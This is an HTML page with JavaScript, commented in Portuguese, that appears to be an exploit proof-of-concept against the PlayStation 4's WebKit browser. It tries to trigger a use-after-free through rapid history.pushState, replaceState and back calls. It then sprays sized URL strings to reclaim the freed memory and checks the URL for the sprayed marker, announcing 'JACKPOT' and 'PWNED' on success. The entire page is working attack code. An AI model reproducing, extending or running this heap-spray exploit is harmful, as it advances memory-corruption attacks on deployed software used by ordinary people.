<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Native History Spray</title>
<style>
    body { background-color: #000; color: #fff; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #fff; background: #333; color: #fff;
        text-transform: uppercase;
    }
    .btn-8 { border-color: #0f0; color: #0f0; }
    .btn-16 { border-color: #f0f; color: #f0f; }
    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
</style>
</head>
<body>
<h2>PS4 WebKit - Native History Reclaim</h2>
<div id="status">Aguardando...</div>

<button class="btn-8" onclick="runHistorySpray(340356)">MODO 1: 8-BIT (~340KB Chars)</button>

<button class="btn-16" onclick="runHistorySpray(170178)">MODO 2: 16-BIT (~170KB Chars)</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m, type="") { 
    const d = document.createElement("div");
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function runHistorySpray(targetChars) {
    logEl.innerHTML = "";
    statusEl.innerText = "Preparando...";

    // 1. GERAÇÃO DE PAYLOADS
    // Vamos gerar variações ao redor do tamanho alvo para compensar headers.
    // Usamos history.replaceState, então precisamos de strings reais.
    log(`1. Gerando payloads ao redor de ${targetChars} chars...`);
    
    let payloads = [];
    // Variação generosa de +/- 128 bytes
    for(let delta = -128; delta <= 128; delta += 4) {
        let len = targetChars + delta;
        // Prefixo 'W' para ser visível
        payloads.push("W".repeat(len));
    }
    
    // 2. TRIGGER UAF
    log("2. Disparando UAF...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        // NA JANELA CRÍTICA:
        if (i === 47) {
            log(">>> INJETANDO VIA HISTORY API <<<");
            // Spray Síncrono usando a própria API do histórico
            // Isso deve usar o mesmo alocador (IsoHeap)
            for(let p of payloads) {
                // replaceState aloca uma nova string de URL e libera a antiga.
                // Estamos tentando fazer uma dessas novas cair no buraco da antiga.
                // O terceiro argumento é a URL.
                history.replaceState({}, "", "#" + p);
            }
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(200);

    // 3. VERIFICAÇÃO
    checkResult();
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    let changed = false;
    let sample = "";
    
    // Procura por 'W'
    for(let i=1000; i<5000; i++) {
        if(url.charCodeAt(i) === 0x57) { // 0x57 é 'W'
            changed = true;
            sample = "Encontrado 'W' no offset " + i;
            break;
        }
    }

    if(changed) {
        log("!!! JACKPOT !!!", "success");
        log("Native History Spray funcionou!");
        log(sample);
        statusEl.innerText = "PWNED";
        statusEl.style.backgroundColor = "#fff";
        statusEl.style.color = "#000";
    } else {
        log("Falha: Ainda vendo 'V'.");
        log("URL Length Atual: " + url.length);
        log("Nota: Se falhar, o IsoHeap pode estar usando 'Slabs' que não reutilizam imediatamente.");
    }
}
</script>
</body>
</html>
